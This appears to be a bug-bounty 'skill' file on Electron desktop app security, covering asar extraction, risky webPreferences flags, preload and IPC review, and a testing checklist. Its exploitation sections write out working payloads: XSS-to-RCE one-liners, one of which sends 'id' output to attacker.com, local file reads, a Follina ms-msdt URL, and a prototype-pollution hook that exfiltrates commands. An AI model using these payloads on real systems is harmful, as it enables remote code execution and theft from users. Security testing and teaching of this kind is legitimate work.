# Electron App Security Skill

**Trigger:** Electron, desktop app security, nodeIntegration, contextIsolation, IPC, webContents, Electron RCE
**Payout Ceiling:** Critical ($10K–$50K, RCE on desktop) | **100+ Electron BB targets globally**

---

## Why Electron = Huge RCE Opportunity

Electron apps run Chromium (renderer) + Node.js (main process). If an attacker can get
JavaScript execution in the renderer AND Node.js integration is enabled → full OS RCE.
Desktop app RCE = maximum payout on any BB program.

---

## Quick Audit Checklist (Start Here)

### Step 1 — Extract App Files
```bash
# macOS: /Applications/AppName.app/Contents/Resources/app.asar
# Windows: C:\Users\User\AppData\Local\AppName\app\resources\app.asar
# Linux: /usr/lib/appname/resources/app.asar

# Extract asar archive
npm install -g @electron/asar
asar extract app.asar app-extracted/
# Now you have full source code
```

### Step 2 — Check main/background.js for Critical Settings
```bash
grep -r "nodeIntegration" app-extracted/
grep -r "contextIsolation" app-extracted/
grep -r "webSecurity" app-extracted/
grep -r "allowRunningInsecureContent" app-extracted/
grep -r "sandbox" app-extracted/
```

**Dangerous settings to find:**
```javascript
// CRITICAL: nodeIntegration: true
// Any XSS in renderer = full Node.js RCE
webPreferences: {
  nodeIntegration: true,        // ← CRITICAL
  contextIsolation: false,      // ← CRITICAL (disables isolation)
  webSecurity: false,           // ← Disables SOP
  allowRunningInsecureContent: true,
}

// SAFE settings:
webPreferences: {
  nodeIntegration: false,
  contextIsolation: true,
  sandbox: true,
}
```

### Step 3 — Find XSS Sinks with Node Access
```bash
# If nodeIntegration: true, find any XSS → it's RCE
grep -r "innerHTML" app-extracted/renderer/
grep -r "outerHTML" app-extracted/
grep -r "document.write" app-extracted/
grep -r "eval(" app-extracted/
grep -r "dangerouslySetInnerHTML" app-extracted/  # React

# Find user-controlled data flowing to these sinks
```

### Step 4 — Check shell.openExternal
```bash
grep -r "shell.openExternal" app-extracted/
# If user controls the URL → opens attacker's protocol handler
# e.g., shell.openExternal(user_url) → shell.openExternal("file:///etc/passwd")
# Or opens custom URI scheme: myapp://exploit
```

---

## Exploitation Paths

### Path 1: nodeIntegration: true + XSS → RCE
```javascript
// If you find XSS in a renderer page with nodeIntegration: true:
// Normal XSS payload:
<img src=x onerror="alert(1)">

// RCE payload via Node.js require():
<img src=x onerror="require('child_process').exec('calc.exe')">
<img src=x onerror="require('child_process').exec('curl http://attacker.com/$(id|base64)')">

// Read files:
<img src=x onerror="document.write(require('fs').readFileSync('/etc/passwd','utf8'))">
```

### Path 2: contextIsolation: false + Prototype Pollution → Node Access
```javascript
// Without contextIsolation, renderer shares prototype chain with Node
// Prototype pollution in renderer → pollute Node.js objects
Object.prototype.shell = require('child_process').exec;
// Any code calling obj.shell() now executes commands
```

### Path 3: IPC Bridge Injection
```javascript
// Electron IPC: renderer sends messages to main process
// If main process handles messages insecurely:

// VULNERABLE main process:
ipcMain.on('open-file', (event, filepath) => {
  fs.readFile(filepath, ...);  // Attacker controls filepath → path traversal
});

// VULNERABLE: any IPC handler that runs shell commands with renderer-controlled data
ipcMain.on('run-command', (event, cmd) => {
  exec(cmd);  // ← Direct command injection
});
```

### Path 4: protocol.registerFileProtocol → File Read
```javascript
// App registers custom protocol handler
protocol.registerFileProtocol('app', (request, callback) => {
  callback(url.fileURLToPath('path/' + request.url.slice(6)));
});
// Attack: app://../../../../etc/passwd → path traversal
```

### Path 5: webContents.loadURL with User Input
```javascript
// VULNERABLE:
mainWindow.webContents.loadURL(userControlledUrl);
// Attack: file:///etc/passwd → reads local files
// Attack: javascript:require('child_process').exec('id') → code execution
```

---

## Testing with Devtools

```bash
# Enable devtools in production Electron app (if not disabled)
# Method 1: --inspect flag
electron --inspect .
# Attaches Node.js debugger → full code execution

# Method 2: Keyboard shortcut
# Many Electron apps have devtools accessible via F12 or Ctrl+Shift+I
# If enabled → JavaScript console in renderer context

# Method 3: Debug port (often left open in shipped apps!)
nmap -p 9229,9230 localhost
# If open → node debugger → attach → execute arbitrary code
```

---

## Real Example: an example program (Previous Target)
```
Finding: nodeIntegration: true in an example program desktop wallet
Issue: AngularJS template injection in renderer → Node.js RCE
Status: Input was sanitized by AngularJS, blocking exploitation
Lesson: When nodeIntegration: true, ANY XSS in renderer = Critical RCE
Next targets: Find other Electron apps with same setting + unsanitized input
```

---

## Tools
```bash
# Static analysis
grep -r "nodeIntegration: true" . --include="*.js"
asar extract app.asar output/

# Dynamic analysis
electron --inspect=9229 app.js  # Attach debugger
chrome://inspect            # Connect Chrome DevTools to Node process
```

---

## Report Impact Statement
```
"Because this Electron application has nodeIntegration: true and contextIsolation: false,
any successful JavaScript injection (XSS, prototype pollution, IPC injection) in the renderer
process results in arbitrary Node.js code execution. An attacker who triggers this vulnerability
can read/write files, execute system commands, steal credentials stored by the application,
and establish persistent access — all with the privileges of the user running the application."
```

---

---

## Advanced Techniques (KB Part 2)

### Additional Dangerous Flags to Check
```bash
grep -r "enableRemoteModule" app-extracted/
# enableRemoteModule: true — deprecated remote module still active, dangerous
# Allows renderer to access main process modules directly
# CVE history: multiple critical vulns via remote module abuse
```

### Preload Script Enumeration
```bash
# Find preload.js definitions in all BrowserWindow creations:
grep -r "preload:" app-extracted/
# Read preload script — check what contextBridge exposes to renderer:
grep -r "contextBridge.exposeInMainWorld" app-extracted/
# Look for dangerous exposed primitives:
grep -r "exec\|shell\|run\|readFile\|writeFile\|require" app-extracted/preload.js

# In DevTools console of running Electron app — enumerate exposed API:
# Object.keys(window.api || window.electronAPI || window.bridge || {})
```

### shell.openExternal Exploitation (Follina / MSDT Chain)
```javascript
// If app calls shell.openExternal(userInput):
// Windows: inject ms-msdt protocol handler → MSDT RCE (CVE-2022-30190 Follina)
// Example malicious URL:
// ms-msdt:/id PCWDiagnostic /skip force /param "IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($env:APPDATA))x /payload"

// References:
// benjamin-altpeter.de/shell-openexternal-dangers
// Jitsi Meet CVE-2020-25019 (openExternal without URL validation)
```

### Update Mechanism Hijack
```bash
# Check if auto-update downloads packages without signature verification
# and stores them in user-writable temp paths

# Detection:
# 1. Monitor temp directories during update: Procmon on Windows, inotifywait on Linux
# 2. Check TLS pinning and signature verification in updater code
#    grep -r "allowDowngrade\|disableHardwareAcceleration\|signature" app-extracted/

# If update package is stored in user-writable path without signature check:
# Replace update package with malicious executable → persistent RCE
# CVE reference: Doyensec — Signature Validation Bypass in Electron-Updater
```

### Prototype Pollution → Preload Hijack (contextIsolation: false)
```javascript
// Research: Masato Kinugawa — Brave Browser Prototype Pollution IPC bypass
// When contextIsolation: false, renderer shares prototype with preload

// Override Function.prototype.call to intercept privileged preload calls:
const originalCall = Function.prototype.call;
Function.prototype.call = function(ctx, ...args) {
  if (this.name === 'exec') {
    // Attacker gains exec control via polluted prototype
    fetch('https://attacker.com/rce?cmd=' + btoa(args[0]));
  }
  return originalCall.apply(this, arguments);
};
```

## Real-World Case Studies

| App | Vulnerability | Impact |
|-----|------------|--------|
| Discord | XSS via markdown renderer + missing context isolation | RCE on Windows/Mac/Linux |
| Slack | CVE-2023 — Remote Code Execution (Oskars Vegeris) | RCE + bonus |
| VS Code | CVE-2021-43908 — Restricted Mode bypass | vscode-file:// path traversal → nodeIntegration abuse → RCE |
| Notable (markdown editor) | Markdown img tag XSS + nodeIntegration:true | child_process → calc.exe |

## Full Testing Checklist

```
[ ] Extract app.asar → audit webPreferences in ALL BrowserWindow creations
[ ] Check: nodeIntegration, contextIsolation, webSecurity, sandbox, enableRemoteModule
[ ] Find and read ALL preload scripts
[ ] Document all contextBridge.exposeInMainWorld APIs
[ ] Enumerate dangerous exposed methods (exec, shell, readFile, writeFile, require)
[ ] Find XSS entry points: markdown rendering, HTML display, search, notifications
[ ] Test each exposed API with attacker-controlled arguments
[ ] Test update mechanism: signature validation, writable temp paths
[ ] Test shell.openExternal with ms-msdt, file://, javascript: URIs
[ ] Test all IPC handlers for command injection (ipcMain.on / ipcMain.handle)
[ ] Check debug port: nmap -p 9229,9230 localhost (often open in shipped apps)
```

## References

- Doyensec awesome electron hacking: https://github.com/doyensec/awesome-electronjs-hacking
- Electron security docs: https://www.electronjs.org/docs/latest/tutorial/security
- 0-click RCE Electron: https://lsgeurope.com/post/0-click-rce-in-electron-applications
- deepstrike.io pentest guide: https://deepstrike.io/blog/penetration-testing-of-electron-based-applications
- Bishop Fox secure Electron: https://bishopfox.com/blog/reasonably-secure-electron

---

*Enhanced by KB Part 2 ingestion 2026-03-04*

*Skill: electron-security | Created 2026-03-04 | GAP-G from strategic study | Ceiling: Critical ($10K–$50K, desktop RCE)*
